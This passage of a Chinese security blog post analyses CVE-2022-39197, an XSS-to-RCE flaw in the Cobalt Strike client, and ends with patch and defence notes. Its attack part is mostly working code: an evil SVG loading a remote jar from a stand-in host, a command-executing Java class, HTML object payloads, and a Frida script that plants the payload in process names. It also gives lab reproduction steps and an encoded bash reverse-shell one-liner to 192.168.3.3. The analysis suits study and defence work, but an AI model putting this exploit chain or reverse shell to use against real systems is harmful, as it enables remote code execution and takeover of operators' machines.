alt="漏洞入口ObjectView类的部分源码" style="zoom:50%;"></p><p>调用原理：</p><p>​1）ObjectView类里的源码：这里获取当前元素的属性集合，然后从属性集合中获取CLASSID属性的值。接着使用Java反射机制加载该类，并创建一个实例对象，并通过调用setParameters设置参数。这个类必须有无参的构造方法且类继承于Component类，否则抛出异常。</p><p>​ 2）setParameters方法源码分析：</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401231751208.png" alt="setParameters方法的部分源码" style="zoom:50%;"></p><p>​方法需要两个参数：<u>一个Component对象和一个AttributeSet对象</u>。首先，获取组件的类信息，然后获取该类的所有属性的描述器数组，接着，它遍历属性描述器数组，取出所有属性参数然后循环判断哪些属性参数和标签传入值一致。如果找到了匹配的属性参数，它会将该参数的值转换为字符串，并尝试调用属性描述器的写方法来设置组件的属性值。如果属性不可写或者参数数量不止一个且不为string，它会忽略该标签传入值。最后反射执行对应方法。</p><p>​3）怎么判断属性是否可写：通过看它是否有对应的set方法，如一个属性是Name，那就看这个类有没有setName方法</p><p>​ <strong>总结下来ObjectView类要求</strong>：</p><p>(1)通过参数classid传入需要实例化的类，类必须继承于Component。</p><p>(2)类必须有无参构造方法。</p><p>(3)类属性可写，即属性必须存在一个对应的set方法。</p><p>(4)set方法的参数必须是一个string类型。</p><p>​ 而<strong>JLabel</strong>：是JavaSwing中的一个类，用于在GUI（图形用户界面）上显示文本或图像，继承于Component。JLabel不需要任何参数来创建对象，有无参数构造方法：publicJLabel() {this("", null,LEADING);}。并且有text属性和需要String参数的setText方法，满足ObjectView类要求：publicvoid setText(String text)。</p><p>​ 那么尝试构造：</p><p><code>&lt;html&gt;&lt;object classid='javax.swing.JLabel'&gt;&lt;param name='Text' value='test'&gt;</code></p><p>​ 执行效果如图:</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401231753207.png" alt="JLabel的object注入" style="zoom:50%;"></p><p>​JLabel的setText()方法可以实现object注入，<strong>但只能用于设置标签的文本内容</strong>。它接受一个字符串参数，该字符串将被显示在标签上，只能用于显示静态的文本信息，并不会解析执行代码，如JavaScript代码。</p><p>​后续研究方向：从lib包里寻找符合条件的类和方法以最终实现执行远程代码</p><h3 id="寻找rce利用链">2.3 寻找RCE利用链</h3><p>​在需要满足类继承于Component、包含无参的构造方法、类中有一个set方法，该方法只接受一个String类型的参数的条件下，分析得出Swing本身的库满足以上条件的大多为<u>参数预处理功能</u>，与代码执行无关</p><p>​ 继而分析CobaltStrike源码jar包，发现org.apache.batik.swing.JSVGCanvas类的setURI方法配合漏洞可以实现远程代码执行</p><p>​ ApacheBatik是一个开源的SVG工具包，它提供了一组Java类库，用于处理SVG文档、转换SVG文档为其他格式（如PNG、JPEG等）、显示SVG文档等。而org.apache.batik.swing.JSVGCanvas是一个JavaSwing组件，用于显示和操作可缩放矢量图形（SVG）文件</p><p>​<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401231755913.png" alt="JSVGCanvas类的setURI方法" style="zoom:50%;"></p><p>​1）JSVGCanvas类其中的setURI方法接受一个字符串类型参数var1。这个方法实际上是用来设置uri属性的。将uri属性设置为传递进来的var1参数。如果uri不为null，就调用loadSVGDocument方法加载传入的SVG文档。那这个setURI方法的可控输入就为SVG文档</p><p>​2）而SVG文档是一种基于xml的矢量图形格式，用于描述二维图形和动画。它可以在各种设备和平台上显示，并且<strong>可以通过CSS和JavaScript进行样式和交互控制</strong></p><p>​ 3）虽然SVG文档支持JavaScript，<strong>但这里CobaltStrike环境不能执行JavaScript代码</strong>，执行报错，分析在batik.bridge.BaseScriptingEnvironment.loadScripts函数，👇</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401231756440.png" alt="loadScripts类部分源码" style="zoom:50%;"></p><p><strong>发现所需条件</strong>：</p><p>(1)type需为application/java-archive</p><p>(2)String href =XLinkSupport.getXLinkHref(script);读取namespaceURL为http://www.w3.org/1999/xlink的href属性的内容，如果没读到，这里href的值为空字符串。</p><p>(3)getBaseURI()用来获取SVG数据源的URL，作为参数传给ParsedURL对象。</p><p>(4)checkCompatibleScriptURL：实际调用DefaultScriptSecurity方法，要求远程SVG文件和远程jar包地址host相同。</p><p>(5)DocumentJarClassLoader是URLClassLoader的封装，URLClassLoader的作用是加载远程jar包。第一个参数指定了远程jar包的地址，实际为创建ParsedURL对象时的第二个参数href，即xlink:href属性内容。</p><p>(6)远程jar包需包含META-INF/MANIFEST.MF文件，且其中Script-Handler的值为需要远程加载类的类名。</p><p>(7)getMainAttributes()方法返回该Jar文件的主清单文件的Attributes对象，getValue("Script-Handler")方法返回该Attributes对象中名为"Script-Handler"的属性的值，也就是类名，将其赋值给变量var13。</p><p>(8)变量var26将动态加载类var13，并实例化为ScriptHandler类型的对象。那么由于var13可控，那么我们就可以通过这种方式来构造远程代码执行</p><p>​ 那么准备SVG文件： <pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span></span><span class="hljs-tag">    <span class="hljs-attr">xmlns:xlink</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/xlink&quot;</span></span><span class="hljs-tag">    <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;application/java-archive&quot;</span> <span class="hljs-attr">xlink:href</span>=<span class="hljs-string">&quot;http://xxx/evil.jar&quot;</span>/&gt;</span><span class="handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">text</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span></span></span></code></pre>准备实现远程代码执行功能的恶意jar包，测试功能：针对不同系统弹出计算器，代码如下<pre><code class="hljs reasonml">import java.io.IOException;public <span class="hljs-keyword">class</span> Exp &#123;    public <span class="hljs-constructor">Exp()</span> throws IOException &#123;        String os = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>get<span class="hljs-constructor">Property(<span class="hljs-string">&quot;os.name&quot;</span>)</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">LowerCase()</span>;        <span class="hljs-keyword">if</span>(os.index<span class="hljs-constructor">Of(<span class="hljs-string">&quot;mac&quot;</span>)</span>&gt;=<span class="hljs-number">0</span>)&#123;            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span>.exec(<span class="hljs-string">&quot;open -na Calculator&quot;</span>);        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(os.index<span class="hljs-constructor">Of(<span class="hljs-string">&quot;windows&quot;</span>)</span>&gt;=<span class="hljs-number">0</span>)&#123;            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span>.exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);        &#125;<span class="hljs-keyword">else</span> &#123;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span>.exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);&#125;&#125;&#125;</code></pre> payload： <pre><code class="hljs routeros">&lt;html&gt;&lt;object <span class="hljs-attribute">classid</span>=<span class="hljs-string">&#x27;org.apache.batik.swing.JSVGCanvas&#x27;</span>&gt;&lt;param name= <span class="hljs-string">&#x27;URI&#x27;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&#x27;http://xxx/test.svg&#x27;</span>&gt;</code></pre></p><p><strong>那么总结RCE调用链流程图如下👇</strong></p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401231801157.png" alt="RCE利用链流程图" style="zoom:50%;"></p><h3 id="反制原理">2.4 反制原理</h3><p>​ CobaltStrike会话上线的beacon元数据里的用户名、主机名、操作系统信息等都是有长度限制的，由RSA加密，且能修改的部分只有user、computer、process字段，想要插入有效<code>&lt;html&gt;</code>标签的payload，可以从后续通信的AES数据入手，beacon和teamserver之间的通信分为两个阶段，第一个阶段是上线包的RSA加密，第二个阶段是后续命令下发的AES加密。在第二个阶段中，我们可以注入进程名称数据来绕过元数据的长度限制，进行XSS攻击，进一步实现远程代码执行。</p><p>​而注入进程名可以通过Python的Frida实现(Frida是一种动态插桩工具，可以在运行时修改和监视应用程序的行为。多用于应用程序的逆向工程、漏洞分析、安全测试等方面)。当攻击者试图对会话执行列出进程，反制者通过Frida注入应用程序修改返回的进程名称为精心构造的payload，攻击者浏览到该进程名，远程代码执行则会实现</p><p>​ 1) exp Python文件关键代码： <pre><code class="hljs routeros">pid = frida.spawn(target)  session = frida.attach(pid) script = session.create_script(frida_script) script.load() frida.resume(pid)frida.kill(pid)</code></pre> ​使用Frida库在设备上启动一个进程，并返回该进程的进程ID（PID）。target是要启动的进程的名称或者路径。然后attach连接这个运行的进程。这个函数会返回一个session，表示与目标进程的连接会话。通过这个会话，在目标进程中执行JavaScript代码，或者使用Frida提供的API来进行各种操作。这里将Frida脚本加载到目标进程，使目标进程开始执行Frida脚本中的代码，最后终止该进程</p><p>​ 2)Frida部分脚本代码: <pre><code class="hljs javascript"><span class="hljs-keyword">var</span> pProcess32Next = Module.findExportByName(<span class="hljs-string">&quot;kernel32.dll&quot;</span>, <span class="hljs-string">&quot;Process32Next&quot;</span>) Interceptor.attach(pProcess32Next, &#123;        onEnter: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>) </span>&#123;            <span class="hljs-built_in">this</span>.pPROCESSENTRY32 = args[<span class="hljs-number">1</span>];            <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">Process.arch == <span class="hljs-string">&quot;ia32&quot;</span></span>)</span>&#123;<span class="hljs-built_in">this</span>.exeOffset = <span class="hljs-number">36</span>;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-built_in">this</span>.exeOffset = <span class="hljs-number">44</span>;&#125;            <span class="hljs-built_in">this</span>.szExeFile = <span class="hljs-built_in">this</span>.pPROCESSENTRY32.add(<span class="hljs-built_in">this</span>.exeOffset);&#125;,        onLeave: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">retval</span>) </span>&#123;            <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params"><span class="hljs-built_in">this</span>.szExeFile.readAnsiString() == <span class="hljs-string">&quot;beacon.exe&quot;</span></span>)</span> &#123;                send(<span class="hljs-string">&quot;[!] Found beacon, injecting payload&quot;</span>);                <span class="hljs-built_in">this</span>.szExeFile.writeAnsiString(payload);&#125;&#125;&#125;)</code></pre></p><p>​在kernel32.dll模块中查找并获取Process32Next函数的地址，并将其赋值给变量pProcess32Next。Process32Next函数是Windows系统中的一个API函数，用于枚举进程信息。Frida中使用这个函数来获取正在运行的进程的信息。然后用Interceptor.attach()方法拦截函数调用。</p><p>​然后根据当前进程的架构（32位或64位）来设置偏移量的值。不同架构的操作系统，可执行文件在PE文件格式中的偏移量不同。接着根据偏移量定位可执行文件名称。Windows系统的进程信息结构体PROCESSENTRY32中的szExeFile成员变量存储了进程的可执行文件名称，那么获取该成员的地址并将其赋值给变量this.szExeFile。</p><p>​ 通过readAnsiString()方法读取进程的可执行文件名称。判断是否为“beacon.exe”。如果是，则使用this.szExeFile.writeAnsiString(payload)将payload注入到该进程中，最后使用send函数将注入操作的结果发送给Frida客户端。【后续也可将文件名设置为变量】</p><p>​ 3）<strong>总结</strong>：EXP通过在 Windows 操作系统中拦截Process32Next函数的调用，并在进程列表中查找名为beacon.exe的进程，如果找到了该进程，就会注入进程，修改进程名为payload代码</p><h2 id="漏洞复现">3.漏洞复现</h2><p>参考：</p><blockquote><p><a href="https://mp.weixin.qq.com/s?__biz=MzkyMDE4NzE1Mw==&amp;mid=2247484355&amp;idx=1&amp;sn=1d2df2c1eac378875fe1c0d408478979&amp;scene=21#wechat_redirect">简单复现</a></p><p><a href="https://mp.weixin.qq.com/s/1FUvdOqmDPcFptlfkDk-rg">简单2</a></p><p>poc: https://github.com/its-arun/CVE-2022-39197</p><p>https://blog.csdn.net/qq_50854662/article/details/129181019</p></blockquote><h3 id="漏洞自查">3.1 漏洞自查</h3><p>​ 受该漏洞影响的版本:Cobalt Strike &lt;= 4.7 ​ 连接CobaltStrike服务端，启动Cobalt Strike客户端。 ​客户端配置监听器，名称处输入以下代码：</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">classid</span>=<span class="hljs-string">&#x27;org.apache.batik.swing.JSVGCanvas&#x27;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>= <span class="hljs-string">&#x27;URI&#x27;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;http://xxx/a.svg&#x27;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span></code></pre><p>​代码含义：创建一个SVG画布对象。classid属性指定要使用的Java类库，这里是ApacheBatik的SVG画布类org.apache.batik.swing.JSVGCanvas。这个类库可以在Java应用程序中显示和操作SVG图像。<code>&lt;param&gt;</code>标记用于传递参数给SVG画布对象，这里的参数是SVG图像的URL地址，URI value处设置为DNSlog地址，查看DNSlog记录判断CobaltStrike能否远程访问，<strong>注意：这里的URI必须以http://开头否则Swing无法解析地址,如图</strong></p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401231810438.png" alt="SVG解析地址报错" style="zoom:50%;"></p><p>1）payload选项默认，这里用dnslog原理测试漏洞是否存在</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202402021828187.png" alt="配置监听器" style="zoom:50%;"></p><p>2）点击保存，客户端会触发HTTP访问，查看DNSlog是否有访问记录即可判断是否有漏洞，<u>这里本地CobaltStrike存在该漏洞</u></p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202402021828841.png" alt="本地自查Cobalt Strike存在漏洞" style="zoom:50%;"></p><p>3）进一步本地验证能否触发远程代码执行漏洞：名称处的URIvalue修改为本地端口9898搭建的SVG文件地址。</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">classid</span>=<span class="hljs-string">&#x27;org.apache.batik.swing.JSVGCanvas&#x27;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>= <span class="hljs-string">&#x27;URI&#x27;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;http://127.0.0.1:9898/evil.svg&#x27;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span></code></pre><p>4）提前准备的SVG文件内容：表示一个SVG图像，其中SVG脚本元素包含一个指向一个jar包的超链接，并将其作为脚本引入SVG图形中，SVG被触发会访问远程jar包</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;100&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100&quot;</span> <span class="hljs-attr">xmlns:xlink</span> =<span class="hljs-string">&quot;http://www.w3.org/1999/xlink&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;application/java-archive&quot;</span> <span class="hljs-attr">xlink:href</span>= <span class="hljs-string">&quot;http://127.0.0.1:9898/EvilJar-mac-calc.jar&quot;</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span></code></pre><p>5）EvilJar-mac-calc.jar：弹出计算器，<u>本地漏洞成功实现代码执行</u></p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202402021830741.png" alt="本地利用漏洞实现代码执行" style="zoom:50%;"></p><h3 id="反制复现">3.2 反制复现</h3><p>cs服务端：vps centos：1.xxx.172</p><p>攻击者：mac，10.211.55.2</p><p>受害者：虚拟机win，10.211.55.3</p><p>实现结果：受害者运行马，攻击者mac上的客户端上线，同时mac被反制弹出计算器</p><p>1.编辑恶意文件内容</p><p>编辑EvilJar.java，更改第19行代码参数为rce命令例如弹出计算器</p><p>目标为win时的命令：</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202303241524024.png" alt="x" style="zoom:50%;"></p><p>为mac的命令：</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202303282357968.png" alt="image-20230328235735922" style="zoom: 33%;"></p><p>2.java编译，生成jar文件：在右侧的Maven栏目中，在Lifecycle中点击package，运行maven构建</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202303241602900.png" alt="自定义jar包" style="zoom: 33%;"></p><p>(这里使用eclipse进行编译的话：</p><p>​ 菜单栏点击File -&gt; 选择Export导出 -&gt; 选择java文件夹 -&gt;选择底下的JAR file -&gt; next之后在新的界面选择项目Eviljar -&gt;browser浏览生成的位置 -&gt;finish即可生成jar文件。将其置于serve路径下)</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202303281117552.png" alt="image-20230328111753975"></p><p>3.木马文件(exe)要和poc py文件置于同一路径下</p><p>4.在server路径下启动web服务==》满足目标能访问</p><pre><code class="hljs angelscript">python -m http.server --bind <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> <span class="hljs-number">9898</span></code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202303281118179.png" alt="image-20230328111843140" style="zoom: 33%;"></p><p>5.编辑在此文件夹下的evil.svg文件，将[attacker]替换为当前路径启用的web地址【虚拟机win上开启web服务，mac可以访问】（不同测试忘换图，这里图里hrefip应该为win端ip10.211.55.3）</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202303241612951.png" alt="x"></p><p>6.cs客户端生成网页马</p><p>​ win伪装成受害者下载网页马beacon.exe</p><p>7.win执行pocpy文件，cs客户端看到马上线后查看用户进程时，自己界面被弹出计算器</p><pre><code class="hljs angelscript">python cve<span class="hljs-number">-2022</span><span class="hljs-number">-39197.</span>py beacon.exe http:<span class="hljs-comment">//10.211.55.3:9898/evil.svg</span></code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202303290005652.png" alt="执行poc"></p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202303281645298.png" alt="目标上线" style="zoom: 25%;"></p><p>这时cs客户端进程名已被污染</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202303281646669.png" alt="cs客户端进程名被污染" style="zoom: 25%;"></p><p>​</p><p>​<strong>当滚动进程列表进行查看当前会话所在进程名时即触发，请求攻击者web服务上的evil.svg文件，而evil.svg文件又继续加载请求恶意文件EvilJar-1.0-jar-with-dependencies.jar，成功执行命令，从而达到RCE</strong></p><p>​ 反制者收到cs端请求：</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202303290008049.png" alt="请求"></p><p>​</p><p>​ cs端被执行命令：</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202303290008935.png" alt="被反制"></p><p>⚠️：</p><p>1.弹出计算器需等待一会</p><p>2.下线是因为poc 文件里设置等待100s后就会终止</p><p>3.马的名字必须与poc里的beacon.exe一样，否则rce失败【当然后续都改为别的名字也可行】</p><p>改成任意名字都可以：（py文件里line27）</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202303301338977.png" alt="image-20230330133839485" style="zoom: 33%;"></p><h3 id="进一步反制复现测试">3.3 进一步反制复现测试</h3><p>mac本地开启cs服务端、客户端</p><pre><code class="hljs angelscript">cd /Users/romanc9/software/cs/cobaltstrike4<span class="hljs-number">.3</span>sudo ./teamserver <span class="hljs-number">10.211</span><span class="hljs-number">.55</span><span class="hljs-number">.2</span> <span class="hljs-number">123456</span>./start.shjava -XX:ParallelGCThreads=<span class="hljs-number">4</span> -XX:+AggressiveHeap -XX:+UseParallelGC -Xms512M -Xmx1024M - javaagent:CSAgent.jar=<span class="hljs-number">3</span>a4425490f389aeec312bdd758ad2b99 -Duser.language=en -jar cobaltstrike.jar</code></pre><p>【复现成功，前面失败可能：jar文件不是mac的弹计算器，而是win的】</p><p>cs server+客户端：mac</p><p>攻击机：mac：10.211.55.2</p><p>受害者/反制者：虚拟机win10：10.211.55.6</p><p>生成mac calc恶意jar</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304190139739.png" alt="image-20230419013934659"></p><p>生成web后门</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304181049670.png" alt="image-20230418104955614"></p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304181050120.png" alt="image-20230418105008045" style="zoom:50%;"></p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">10.211</span>.<span class="hljs-number">55.2</span>:<span class="hljs-number">80</span>/beacon.exe</code></pre><p>靶机win下载木马</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304181051006.png" alt="image-20230418105111924"></p><p>​经测试，因虚拟机win10和mac都是arm64系统，所以经mac编译的exe文件虚拟机win10可运行，那么可直接生成exe文件复制粘贴而无需网页马</p><p>win执行exp</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304191055371.png" alt="image-20230419011651757"></p><p>mac cs客户端被反制</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304190115930.png" alt="image-20230419011537847"></p><p>即使断开连接了还能弹出计算器</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304190122144.png" alt="image-20230419012208085"></p><p>删除会话也是，只要停留在这个进程页面都会弹，但必须是鼠标滚动到出现恶意进程名才会弹，鼠标停留在正常进程名字不会弹</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304190123022.png" alt="image-20230419012332945"></p><p>同时反制者也能观察到记录，但都没有访问jar的记录</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304190128491.png" alt="访问记录" style="zoom:50%;"></p><p>这时修改恶意jar包/删除/移动还是能弹，怀疑cs本地存在缓存/在加载恶意名的时候即下载恶意jar到本地了</p><p>把http服务关闭后就不会再弹了，显示502网关错误</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304190137207.png" alt="报错"></p><h2 id="漏洞防御补丁">4.漏洞防御&amp;补丁</h2><p>防御办法：升级版本/打补丁</p><p><strong>--更新版本：</strong></p><p>​4.7.1版本已将新属性添加到TeamServer.prop文件（位于TeamServer的主文件夹中）：imits.beacons_xssvalidated指定是否对选定的beacon元数据执行XSS验证。默认情况下设置为true</p><p><strong>--官方补丁</strong>：https://github.com/burpheart/CVE-2022-39197-patch</p><p>​ 补丁原理：<u>通过在CobaltStrike客户端启动时修改javax.swing.plaf.basic.BasicHTML类的isHTMLString方法，以禁用Swing框架的HTML支持功能</u></p><p>补丁使用方法</p><p>​ (1)下载patch.jar包，将patch.jar放入CobaltStrike启动目录下，即与cobaltstrike.jar同一目录。</p><p>​ (2)在Cobalt Strike客户端启动参数中加入javaagent 启用补丁</p><pre><code class="hljs css"><span class="hljs-selector-tag">-javaagent</span><span class="hljs-selector-pseudo">:patch.jar</span></code></pre><p>​ (3)启动Cobalt Strike输出Successfully Patched.即为补丁启用成功。<strong>经测试，如果只有服务端启动补丁，CobaltStrike客户端不启动补丁，还是存在漏洞。</strong></p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202402021850336.png" alt="客户端不打补丁的漏洞利用" style="zoom:50%;"></p><p>​ (4)当CobaltStrike客户端启动补丁，漏洞则不会触发，HTML代码会直接输出出来作为纯文本</p><p>​ 客户端加上补丁启动：</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202402021851817.png" alt="客户端加上补丁启动" style="zoom:50%;"></p><p>​ 客户端文字输出HTML：</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202402021851138.png" alt="客户端文字输出HTML" style="zoom:50%;"></p><h2 id="思考问题">5.思考问题</h2><p>分析该漏洞的时候，需明确几个节点</p><p>1.Cobalt Strike漏洞与swing的关系</p><p>2.漏洞是怎么从xss到rce的</p><p>3.漏洞触发条件是攻击者查看用户进程吗，原理？</p><p>4.代码攻击链怎么形成的</p><h2 id="踩坑注意事项">6.踩坑/注意事项🚩</h2><p>1.<em>mac m1 下生成的 shell , x86 运行上不了线</em>==&gt;网页马可以解决</p><p><u>建议 cs 全套都在 x86 的机器上弄</u></p><blockquote><p>https://cn-sec.com/archives/1544546.html</p></blockquote><pre><code class="hljs stata">PS:<span class="hljs-keyword">mac</span>本机开启服务端、客户端，不管是http、https后门exe，虚拟<span class="hljs-keyword">win</span>都无法上线后门换成网页马，<span class="hljs-keyword">win</span>下载运行exe可以上线</code></pre><p>cs网页马形式：</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202303301445459.png" alt="网页马" style="zoom:50%;"></p><p>但若都是arm机器：测试时可以直接鼠标拖拽运行上线</p><p>2.报错：</p><p>​frida与python版本报错：https://blog.csdn.net/song_lee/article/details/105102108【Buildingwheel for frida】</p><p>​也就是要单独下载适配系统、python版本whl包安装即可：https://blog.csdn.net/weixin_34722995/article/details/70043392?fps=1&amp;locationNum=2、https://pypi.org/project/frida/16.0.2/#history</p><pre><code class="hljs awk">使用如下命令查看，查看当前平台支持的版本【https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/t18438605018/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">121769227</span>】pip debug --verbose</code></pre><p>3.如何关闭frida</p><blockquote><p>如果是在命令行模式下使用Frida，可以使用Ctrl+C组合键来终止正在运行的程序，并关闭Frida。如果是在Python脚本中使用Frida，可以使用<code>sys.exit()</code>命令来关闭Frida。如果正在使用Frida的GUI应用程序，可以在该应用程序中的“File”菜单中找到“Exit”选项来关闭Frida。无论使用哪种方法来关闭Frida，都应确保所有Frida进程和插件已经停止，并释放所有相关资源，确保系统安全和稳定。</p></blockquote><p>​</p><p>4.在Python脚本中使用Frida，运行失败如何关闭frida</p><blockquote><p>如果在Python脚本中使用Frida运行失败，可以手动关闭Frida来结束它的运行，步骤如下：</p><ol type="1"><li>打开终端或命令行窗口。</li><li>输入"ps -ef | grep frida"命令，查找当前运行的Frida进程ID。</li><li>输入"kill 接下来加上Frida进程ID"命令，强制结束Frida进程。如果使用的是Windows系统，则可以通过任务管理器来结束Frida进程。打开任务管理器，找到Frida进程，右键点击它，选择结束进程即可。</li><li>注意，结束Frida进程会导致Frida脚本中的操作被取消，如果需要继续使用Frida，请检查原因并尝试修复问题。</li></ol></blockquote><p><strong>经测试，若中途出现任务无法响应的情况，直接任务管理器结束任务即可，测试出现的frida报错导致无法启动frida的情况只能靠重启电脑实现，怀疑是缓存原因导致</strong></p><p>5.除了基础测试漏洞的弹出计算器，还可进一步测试rce：</p><blockquote><p>反弹shell</p><p>https://blog.spoock.com/2018/10/31/reverse-shell-on-limited-environments/</p><p>https://xz.aliyun.com/t/5257</p><p>https://www.cnpanda.net/codeaudit/759.html</p></blockquote><pre><code class="hljs angelscript">java命令:Runtime.getRuntime().exec(<span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMy8xMjM0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);bash命令：bash -i &gt;&amp; /dev/tcp/<span class="hljs-number">192.168</span><span class="hljs-number">.3</span><span class="hljs-number">.3</span>/<span class="hljs-number">1234</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span></code></pre><p>6.注意测试时Windows运行马时可以开启简单杀软避免defener误删</p><blockquote><p>https://github.com/Tlaster/YourAV</p></blockquote><p>7.运行pocpy文件之前先安装依赖，由于我这遇到了问题就贴出来最后解决的命令</p><pre><code class="hljs jboss-cli">pip install -r requirements.txt -i http:<span class="hljs-string">//pypi.douban.com/simple</span> <span class="hljs-params">--trusted-host</span> pypi.douban.com <span class="hljs-params">--no-cache-dir</span></code></pre><h2 id="延伸参考">延伸参考</h2><p>https://nvd.nist.gov/vuln/detail/CVE-2021-36798</p><p>张慧琳,邹维,韩心慧.网页木马机理与防御技术[J].软件学报,2013,24(04):843-858.</p><p>刘晨,李春强,丘国伟.基于CobaltStrike和Office漏洞的入侵者反制研究[J].网络空间安全,2018,9(01):56-61.</p><p>Strategic Cyber Cobalt Strike[J].SC magazine,2014,25(2):44-44</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VulnHub-Raven: 2（udf webshell上传提权）</title>
    <link href="/2022/05/20/%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/"/>
